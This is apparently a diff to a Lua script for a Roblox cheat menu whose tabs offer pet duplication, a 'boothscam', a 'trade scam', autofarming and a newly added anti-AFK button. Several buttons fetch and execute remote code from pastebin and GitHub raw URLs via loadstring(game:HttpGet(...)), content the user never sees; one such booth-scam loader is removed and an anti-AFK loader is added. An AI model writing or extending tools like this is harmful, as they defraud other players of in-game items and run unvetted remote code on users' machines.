@@ -7,6 +7,7 @@ local Tab2 = Window:NewTab("boothscam")
 local Tab3 = Window:NewTab("autofarm")
 local Tab4 = Window:NewTab("trade scam")
 local Tab5 = Window:NewTab("credits")
+local Tab6 = Window:NewTab("anti afk")
 
 -- Sections Inside Tabs
 local Tab1Section = Tab1:NewSection("dupe the pet")
@@ -15,6 +16,7 @@ local Tab3Section = Tab3:NewSection("autofarm")
 local Tab4Section = Tab4:NewSection("trade scam")
 local Tab5Section = Tab5:NewSection("jeslie_boy12")
 local Tab5Section = Tab5:NewSection("In FaceBook AJ De Jesus")
+local Tab6Section = Tab6:NewSection("anti afk gui")
 
 -- Buttons
 Tab1Section:NewButton("dupe pet", "this dupe is make your pet hc but wait 1 hour!", function()
@@ -30,8 +32,7 @@ Tab4Section:NewButton("trade scam script", "gui trade scam", function()
 end)
 -- lets fix
 
-Tab2Section:NewButton("boothscam", "press the any exclusive or huge 8x in both and rejoin", function()
-    loadstring(game:HttpGet(("https://pastebin.com/raw/qhsmEwHn"), true))()
+Tab2Section:NewButton("boothscam (patch)", "fix soon", function()
 end)
 
 -- Tab3
@@ -43,3 +44,10 @@ end)
 Tab3Section:NewButton("Autofarm gems   ", "Gems farm!", function()
     loadstring(game:HttpGet(("https://pastebin.com/raw/qhsmEwHn"), true))()
 end)
+
+-- Tab6
+
+Tab6Section:NewButton("anti afk script   ", "this script is anti afk", function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/RTrade/Voidz/main/AntiAFK.lua'),true))()
+end)
+
